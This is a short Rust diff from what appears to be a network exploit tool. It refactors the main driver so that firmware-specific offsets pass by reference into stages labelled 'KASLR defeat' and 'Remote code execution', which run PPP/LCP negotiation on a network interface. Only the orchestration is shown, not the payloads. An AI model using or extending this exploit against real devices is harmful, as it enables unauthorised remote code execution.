@@ -16,7 +16,12 @@ fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
     Ok(buffer) // Return the buffer
 }
 
-fn run_exploit(interface_name: String, offsets: Offsets, stage1_path: String, stage2_path: String) {
+fn run_exploit(
+    interface_name: String,
+    offsets: &Offsets,
+    stage1_path: String,
+    stage2_path: String,
+) {
     // Find interface
     let interface = datalink::interfaces()
         .into_iter()
@@ -61,12 +66,12 @@ fn run_exploit(interface_name: String, offsets: Offsets, stage1_path: String, st
     print_current_state(&expl.exploit_state);
 
     println!("\n[+] STAGE 2: KASLR defeat");
-    expl.defeat_kaslr(&interface);
+    expl.defeat_kaslr(offsets, &interface);
 
     print_current_state(&expl.exploit_state);
 
     println!("\n[+] STAGE 3: Remote code execution");
-    expl.remote_code_exec(&interface);
+    expl.remote_code_exec(offsets, &interface);
     expl.exploit_state.source_mac = constants::SOURCE_MAC;
     expl.ppp_negotiation(&interface, None);
     expl.lcp_negotiation(&interface);
@@ -88,5 +93,5 @@ fn main() {
     let args: Args = get_args();
     println!("{}", args);
     let offsets = get_offset_from_firmware(args.fw);
-    run_exploit(args.interface, offsets, args.stage_1, args.stage_2)
+    run_exploit(args.interface, &offsets, args.stage_1, args.stage_2)
 }
